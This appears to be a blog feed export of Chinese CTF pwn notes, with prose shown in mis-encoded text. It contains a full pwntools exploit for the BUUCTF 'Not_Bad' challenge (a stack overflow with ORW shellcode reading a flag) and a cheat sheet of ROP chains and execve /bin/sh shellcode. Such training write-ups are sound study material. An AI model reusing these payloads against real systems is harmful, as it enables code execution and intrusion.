    <content type="html"><![CDATA[<h1 id="è§£å¯†ç³»åˆ—"><a href="#è§£å¯†ç³»åˆ—" class="headerlink" title="è§£å¯†ç³»åˆ—"></a>è§£å¯†ç³»åˆ—</h1><p>ASCIIç¼–ç æ˜¯Unicodeå­—ç¬¦ç¼–ç çš„ä¸€éƒ¨åˆ†</p><p>ç³»ç»Ÿdllå±äºlevel3ï¼Œå†…æ ¸è¿è¡Œåœ¨level0. </p><h2 id="è™šæ‹Ÿå†…å­˜"><a href="#è™šæ‹Ÿå†…å­˜" class="headerlink" title="è™šæ‹Ÿå†…å­˜"></a>è™šæ‹Ÿå†…å­˜</h2><p>åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹ï¼š</p><ul><li>åº”ç”¨ç¨‹åºæ˜¯ä¸ä¼šç›´æ¥è®¿é—®ç‰©ç†åœ°å€çš„</li><li>è™šæ‹Ÿå†…å­˜ç®¡ç†å™¨é€šè¿‡è™šæ‹Ÿåœ°å€çš„è®¿é—®è¯·æ±‚ï¼Œæ§åˆ¶æ‰€æœ‰ç‰©ç†åœ°å€è®¿é—®</li><li>æ¯ä¸ªç¨‹åºéƒ½æœ‰ç‹¬ç«‹çš„4GBå¯»å€ç©ºé—´ï¼Œä¸åŒç¨‹åºçš„åœ°å€ç©ºé—´æ˜¯è¢«ç›¸äº’éš”ç¦»çš„ã€‚</li><li>DLLç¨‹åºæ²¡æœ‰è‡ªå·±çš„â€œç§æœ‰â€ç©ºé—´ï¼Œå®ƒä»¬ç§°ä¹‹ä¸ºåŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼Œå®ƒä»¬æ€»æ˜¯è¢«æ˜ å°„åˆ°å…¶ä»–åº”ç”¨ç¨‹åºçš„åœ°å€ç©ºé—´ä¸­çš„ï¼Œä½œä¸ºå…¶ä»–åº”ç”¨ç¨‹åºçš„ä¸€éƒ¨åˆ†è¿è¡Œã€‚</li></ul><p>==ç®€åŒ–äº†å†…å­˜çš„ç®¡ç†ï¼Œå¹¶å¯å¼¥è¡¥ç‰©ç†å†…å­˜çš„ä¸è¶³ï¼Œå¦å¤–å¯ä»¥é˜²æ­¢å¤šä»»åŠ¡ç¯å¢ƒä¸‹å„ä¸ªåº”ç”¨ç¨‹åºä¹‹é—´çš„å†²çª==</p><p>ä¸å®åœ°å€æ¨¡å¼ä¸‹çš„â€œæ®µåœ°å€ï¼šåç§»åœ°å€â€ç´¢å¼•æ–¹å¼ç±»ä¼¼ï¼Œè™šæ‹Ÿåœ°å€ä¹Ÿå†™æˆâ€œæ®µï¼šåç§»é‡â€ï¼Œä½†ä¸ºæ®µé€‰æ‹©å­ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>åŸºç¡€çŸ¥è¯†</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ORW-[æå®¢å¤§æŒ‘æˆ˜2019]Not_Bad</title>
    <link href="/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/"/>
    <url>/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/</url>
    
    <content type="html"><![CDATA[<img src="/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/image-20200203001107437.png" class="" title="image-20200203001107437"><h2 id="RWX"><a href="#RWX" class="headerlink" title="RWX"></a>RWX</h2><blockquote><ul><li>Linuxçš„æ–‡ä»¶å’Œç›®å½•çš„æƒé™ï¼Œæœ‰RWXä¸‰ç§ã€‚</li><li>r(Readï¼Œè¯»å–)ï¼šå¯¹æ–‡ä»¶è€Œè¨€ï¼Œå…·æœ‰è¯»å–æ–‡ä»¶å†…å®¹çš„æƒé™ï¼›å¯¹ç›®å½•æ¥è¯´ï¼Œå…·æœ‰<strong>æµè§ˆç›®å½•</strong>çš„æƒé™ã€‚</li><li>w(Write,å†™å…¥)ï¼šå¯¹æ–‡ä»¶è€Œè¨€ï¼Œå…·æœ‰æ–°å¢,ä¿®æ”¹,åˆ é™¤æ–‡ä»¶å†…å®¹çš„æƒé™ï¼›å¯¹ç›®å½•æ¥è¯´ï¼Œå…·æœ‰<strong>æ–°å»ºï¼Œåˆ é™¤ï¼Œä¿®æ”¹ï¼Œç§»åŠ¨ç›®å½•å†…æ–‡ä»¶</strong>çš„æƒé™ã€‚</li><li>x(eXecuteï¼Œæ‰§è¡Œ)ï¼šå¯¹æ–‡ä»¶è€Œè¨€ï¼Œå…·æœ‰æ‰§è¡Œæ–‡ä»¶çš„æƒé™ï¼›å¯¹ç›®å½•äº†æ¥è¯´<strong>è¯¥ç”¨æˆ·å…·æœ‰è¿›å…¥ç›®å½•</strong>çš„æƒé™</li></ul></blockquote><img src="/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/image-20200203144946071.png" class="" title="image-20200203144946071"><p><a href="[https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/](https://blog.betamao.me/2019/01/23/Linuxæ²™ç®±ä¹‹seccomp/)">ä»€ä¹ˆæ˜¯seccomp</a></p><p>ç”¨<a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>æ£€æµ‹ä¸€ä¸‹<code>seccomp-tools dump  ./bad</code></p><img src="/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/image-20200203145031485.png" class="" title="image-20200203145031485"><p>å¯è¿è¡Œopen,read,writeï¼Œä¹Ÿå°±æ˜¯ORW</p><h2 id="å…³é”®ç‚¹"><a href="#å…³é”®ç‚¹" class="headerlink" title="å…³é”®ç‚¹"></a>å…³é”®ç‚¹</h2><img src="/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/image-20200203145324266.png" class="" title="image-20200203145324266"><img src="/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/image-20200203145300314.png" class="" title="image-20200203145300314"><p><code>void *mmap(void *start,size_t length,int prot,int flags,int fd,off_t offsize);</code></p><blockquote><p>mmap()å‡½æ•°çš„ä¸»è¦ç”¨é€”æœ‰ä¸‰ä¸ªï¼š<br>1ã€å°†ä¸€ä¸ªæ™®é€šæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œé€šå¸¸åœ¨éœ€è¦å¯¹æ–‡ä»¶è¿›è¡Œé¢‘ç¹è¯»å†™æ—¶ä½¿ç”¨ï¼Œè¿™æ ·ç”¨å†…å­˜è¯»å†™å–ä»£I/Oè¯»å†™ï¼Œä»¥è·å¾—è¾ƒé«˜çš„æ€§èƒ½ï¼›<br>2ã€å°†ç‰¹æ®Šæ–‡ä»¶è¿›è¡ŒåŒ¿åå†…å­˜æ˜ å°„ï¼Œå¯ä»¥ä¸ºå…³è”è¿›ç¨‹æä¾›å…±äº«å†…å­˜ç©ºé—´ï¼›<br>3ã€ä¸ºæ— å…³è”çš„è¿›ç¨‹æä¾›å…±äº«å†…å­˜ç©ºé—´ï¼Œä¸€èˆ¬ä¹Ÿæ˜¯å°†ä¸€ä¸ªæ™®é€šæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­ã€‚<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œä¸ºå¹¸ç¦å†™æ­Œã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ª CC 4.0 BY-SA ç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚<br><a href="https://blog.csdn.net/yzy1103203312/article/details/78286360">åŸæ–‡é“¾æ¥</a></p></blockquote><p>æ€»çš„æ¥è¯´å°±æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œå†™å…¥orw_shellcodeç„¶åè¿è¡Œhhh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">orw_shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag&quot;</span>)<br>orw_shellcode += shellcraft.read(<span class="hljs-number">3</span>,<span class="hljs-number">0x123000</span>,<span class="hljs-number">0x30</span>)<br>orw_shellcode += shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-number">0x123000</span>,<span class="hljs-number">0x30</span>)<br></code></pre></td></tr></table></figure><p>read(3,addr,length)ï¼Œ3æŒ‡ä»æ–‡ä»¶ç›®å½•ä¸­è¯»å–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = asm(shellcraft.read(<span class="hljs-number">0</span>,<span class="hljs-number">0x123000</span>,<span class="hljs-number">0x90</span>)) + asm(<span class="hljs-string">&quot;mov rax,0x123000;call rax&quot;</span>)<br>   payload = payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&quot;\x00&quot;</span>)<br>   payload += p64(<span class="hljs-number">0x400A01</span>)<span class="hljs-comment">#jmp rsp</span><br>   payload += asm(<span class="hljs-string">&quot;sub rsp,0x30;call rsp&quot;</span>)<br>   sh.sendline(payload)<br></code></pre></td></tr></table></figure><p>è¿™æ ·å­ï¼Œæˆ‘ä»¬æº¢å‡ºä¹‹åï¼Œå…ˆæ‰§è¡Œjmp rspï¼Œç„¶åè¯»å…¥åˆ°0x123000çš„shellcdoeï¼Œè¯»å…¥å®Œæˆä¹‹åæ‰§è¡Œcall raxè¿è¡Œshellcode</p><h2 id="å®Œæ•´exp"><a href="#å®Œæ•´exp" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./bad&#x27;</span>)<br>lib = <span class="hljs-number">0</span><br>sh = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">ip,port,debug</span>):</span><br>    <span class="hljs-keyword">global</span> lib<br>    <span class="hljs-keyword">global</span> sh<br>    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>        sh = process(<span class="hljs-string">&#x27;./bad&#x27;</span>)<br>        lib = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        sh = remote(ip,port)<br>        lib = ELF(<span class="hljs-string">&#x27;/home/robye/Desktop/PWN/libc/64-libc-2.27.so&#x27;</span>)<br>    <br>    orw_shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag&quot;</span>)<br>    orw_shellcode += shellcraft.read(<span class="hljs-number">3</span>,<span class="hljs-number">0x123000</span>,<span class="hljs-number">0x30</span>)<br>    orw_shellcode += shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-number">0x123000</span>,<span class="hljs-number">0x30</span>)<br><br>    sh.recvuntil(<span class="hljs-string">&quot;fun!&quot;</span>)<br>    payload = asm(shellcraft.read(<span class="hljs-number">0</span>,<span class="hljs-number">0x123000</span>,<span class="hljs-number">0x90</span>)) + asm(<span class="hljs-string">&quot;mov rax,0x123000;call rax&quot;</span>)<br>    payload = payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&quot;\x00&quot;</span>)<br>    payload += p64(<span class="hljs-number">0x400A01</span>)<br>    payload += asm(<span class="hljs-string">&quot;sub rsp,0x30;call rsp&quot;</span>)<br>    sh.sendline(payload)<br>    sleep(<span class="hljs-number">0.1</span>)<br>    sh.sendline(asm(orw_shellcode))<br><br>    sh.interactive()<br><span class="hljs-keyword">if</span> __name__ ==  <span class="hljs-string">&quot;__main__&quot;</span>:<br>    pwn(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26591</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>å‘<a href="http://www.qfrost.com/PWN/geek_pwn/">Qfroest</a>å¤§ä½¬å­¦ä¹ </p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
      <category>å¤‡å¿˜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-Shellcode -ORW</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pwnå¸¸ç”¨æŒ‡ä»¤</title>
    <link href="/2020/02/05/Pwn%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
    <url>/2020/02/05/Pwn%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p><code>ldd filename</code> è¯»å–libc</p><p><code>ROPgadget --binary filename --only &quot;pop|ret&quot;</code></p><p><code>__libc_start_main = u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))</code></p><p><code>__libc_start_main = u32(sh.recvuntil(&quot;\xf7&quot;)[-4:])</code></p><p><code>__libc_start_main = u32(sh.recv(4))</code></p><p><code>canary =  u64(sh.recv(7).rjust(8,&quot;\x00&quot;)) log.success(&quot;canary------&gt;&quot; + hex(canary))</code></p><p>æ¥å—æˆintå‹åœ°å€ï¼š<code>str_addr = int(sh.recvuntil(&quot;\n&quot;,True),16)</code></p><p><code>seccomp-tools dump ./filename</code></p><p>æ‰¾ä¸åˆ°flagï¼š<code>grep -rn flag *</code></p><p>32ä½</p><p>ç¬¬ä¸€ä¸ªæ”¾åœ¨rdi ç¬¬äºŒä¸ªæ”¾åœ¨rsi ç¬¬ä¸‰ä¸ªæ”¾åœ¨rdx</p><p>64ä½å°±å¾—</p><h2 id="32ä½"><a href="#32ä½" class="headerlink" title="32ä½"></a>32ä½</h2><h3 id="print"><a href="#print" class="headerlink" title="print"></a>print</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p32(printf_plt)<br>payload += p32(start_vuln)<br>payload += p32(<span class="hljs-number">0x080486F8</span>)<br>payload += p32(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br><br></code></pre></td></tr></table></figure><h3 id="system-â€œ-bin-shâ€"><a href="#system-â€œ-bin-shâ€" class="headerlink" title="system(â€œ/bin/shâ€)"></a>system(â€œ/bin/shâ€)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p32(system)<br>payload += p32(<span class="hljs-number">0</span>)<br>payload += p32(binsh)<br>sh.sendline(payload)<br></code></pre></td></tr></table></figure><h3 id="write"><a href="#write" class="headerlink" title="write"></a>write</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p32(elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>])<br>payload += p32(pop_esi_edi_ebp_ret)<br>payload += p32(<span class="hljs-number">1</span>)<br>payload += p32(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br>payload += p32(<span class="hljs-number">4</span>)<br>payload += p32(start_main)<br></code></pre></td></tr></table></figure><h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p32(elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>])<br>payload += p32(pop3_ret)<br>payload += p32(<span class="hljs-number">0</span>)<span class="hljs-comment">#ä»å“ªé‡Œè¯»å–</span><br>payload += p32(bss_addr)<br>payload += p32(<span class="hljs-number">0x223</span>) <span class="hljs-comment">#é•¿åº¦</span><br></code></pre></td></tr></table></figure><h2 id="64"><a href="#64" class="headerlink" title="64"></a>64</h2><p>1.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">main_arena = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">88</span><br>log.success(<span class="hljs-string">&#x27;main arena: &#x27;</span>+<span class="hljs-built_in">hex</span>(main_arena))<br>libc_base = main_arena - <span class="hljs-number">0x3c4b20</span><br>log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<span class="hljs-number">2.</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">libc_base = u64(sh.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x3C4B78</span><br>malloc_hook = libc_base + libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;libc_base: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>log.success(<span class="hljs-string">&quot;__malloc_hook: &quot;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br></code></pre></td></tr></table></figure><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p64(pop_rdi_ret)<br>payload += p64(binsh)<br>payload += p64(system)<br>sh.sendline(payload)<br></code></pre></td></tr></table></figure><h3 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p64(pop_rdi_ret)<br>payload += p64(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>])<br>payload += p64(start_main)<br><br></code></pre></td></tr></table></figure><h3 id="write-1"><a href="#write-1" class="headerlink" title="write"></a>write</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p64(pop_rdi_ret)<br>payload += p64(<span class="hljs-number">1</span>)<br>payload += p64(pop_rsi_r15_ret)<br>payload += p64(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br>payload += p64(<span class="hljs-number">1</span>)<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>])<br>payload += p64(start_main)<br><br></code></pre></td></tr></table></figure><h2 id="32"><a href="#32" class="headerlink" title="32"></a>32</h2><h3 id="read-1"><a href="#read-1" class="headerlink" title="read"></a>read</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload =p32(elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]) <br>payload += p32(pop3_ret) <br>payload += p32(<span class="hljs-number">0</span>) <br>payload += p32(base)<br>payload += p32(<span class="hljs-number">0x500</span>)<br></code></pre></td></tr></table></figure><h3 id="write-2"><a href="#write-2" class="headerlink" title="write"></a>write</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p32(elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>])<br>payload += p32(pop3_ret)<br>payload += p32(<span class="hljs-number">1</span>)<br>payload += p32(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br>payload += p32(<span class="hljs-number">4</span>)<br>payload += p32(start_main)<br></code></pre></td></tr></table></figure><h2 id="64-1"><a href="#64-1" class="headerlink" title="64"></a>64</h2><h3 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p64(pop_rdi_ret)<br>payload += p64(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br></code></pre></td></tr></table></figure><h3 id="system-â€œ-bin-shâ€-1"><a href="#system-â€œ-bin-shâ€-1" class="headerlink" title="system(â€œ/bin/shâ€)"></a>system(â€œ/bin/shâ€)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p64(pop_rdi_ret)<br>payload += p64(binsh)<br>payload += p64(system)<br>sh.sendline(payload)<br></code></pre></td></tr></table></figure><h3 id="read-2"><a href="#read-2" class="headerlink" title="read"></a>read</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p64(pop_rsi_ret)<br>payload += p64(elf.bss()) <br>payload += p64(elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>])<br></code></pre></td></tr></table></figure><h3 id="open"><a href="#open" class="headerlink" title="open"></a>open</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p64(pop_rdi_ret)<br>payload += p64(elf.bss()+<span class="hljs-number">0x100</span>)<br>payload += p64(pop_rsi_ret)<br>payload += p64(<span class="hljs-number">0</span>)<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;open&#x27;</span>])<br></code></pre></td></tr></table></figure><h3 id="open-read-put"><a href="#open-read-put" class="headerlink" title="open_read_put"></a>open_read_put</h3><img src="/2020/02/05/Pwn%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/image-20200128101042088.png" class="" title="image-20200128101042088"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p64(pop_rsi_ret)<br>payload += p64(elf.bss()+<span class="hljs-number">0x100</span>)<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>])<br><br>payload += p64(pop_rdi_ret)<br>payload += p64(elf.bss()+<span class="hljs-number">0x100</span>)<br>payload += p64(pop_rsi_ret)<br>payload += p64(<span class="hljs-number">0</span>)<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;open&#x27;</span>])<br><br>payload += p64(pop_rdi_ret)<br>payload += p64(<span class="hljs-number">4</span>)<span class="hljs-comment">#?</span><br>payload += p64(pop_rsi_ret)<br>payload += p64(elf.bss()+<span class="hljs-number">0x100</span>)<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>])<br><br>payload += p64(pop_rdi_ret)<br>payload += p64(elf.bss()+<span class="hljs-number">0x100</span>)<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br><br></code></pre></td></tr></table></figure><h2 id="i386"><a href="#i386" class="headerlink" title="i386"></a>i386</h2><p>å¯å‚è€ƒ<a href="http://mrbelieve.tech/2020/01/24/ciscn_2019_s_9/">http://mrbelieve.tech/2020/01/24/ciscn_2019_s_9/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode =<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">xor    eax,eax</span><br><span class="hljs-string">push   eax</span><br><span class="hljs-string">push   0x68732f2f #//sh</span><br><span class="hljs-string">push   0x6e69622f # /bin</span><br><span class="hljs-string">mov    ebx,esp</span><br><span class="hljs-string">mov    ecx,eax</span><br><span class="hljs-string">mov    edx,eax</span><br><span class="hljs-string">mov    al,0xb</span><br><span class="hljs-string">int    0x80</span><br><span class="hljs-string">xor    eax,eax</span><br><span class="hljs-string">inc    eax</span><br><span class="hljs-string">int    0x80</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode =asm(shellcode) <span class="hljs-comment">#ä½¿ç”¨shellcraft.shæ‰“ä¸é€šï¼Œä¼°è®¡æ˜¯å› ä¸ºå¤ªé•¿äº†</span><br>shell=<span class="hljs-string">&quot;sub esp,0x28;call esp&quot;</span><br>shell =asm(shell)<br></code></pre></td></tr></table></figure><h2 id="amd64"><a href="#amd64" class="headerlink" title="amd64"></a>amd64</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">push <span class="hljs-number">0x67616c66</span><br>mov rdi,rsp <br>push <span class="hljs-number">2</span><br>pop rax<br>xor rsi,rsi<br>push <span class="hljs-number">32</span><br>pop rdx<br>syscall<br>mov rdi,rax<br>mov rsi,rsp<br>xor rax,rax<br>syscall<br>push <span class="hljs-number">1</span><br>pop rdi<br>push <span class="hljs-number">1</span><br>pop rax<br>syscall<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">push   <span class="hljs-number">0x42</span><br>pop    rax<br>inc    ah<br>cqo<br>push   rdx<br>movabs rdi, <span class="hljs-number">0x68732f2f6e69622f</span><br><br>push   rdi<br>push   rsp<br>pop    rsi<br>mov    r8, rdx<br>mov    r10, rdx<br>syscal<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">xor    %rsi,%rsi<br>push   %rsi<br>mov $<span class="hljs-number">0x68732f2f6e69622f</span>,%rdi<br>push   %rdi<br>push   %rsp<br>pop    %rdi<br>push  $<span class="hljs-number">0x3b</span><br>pop    %rax<br>cltd   <br>syscall <br></code></pre></td></tr></table></figure><h2 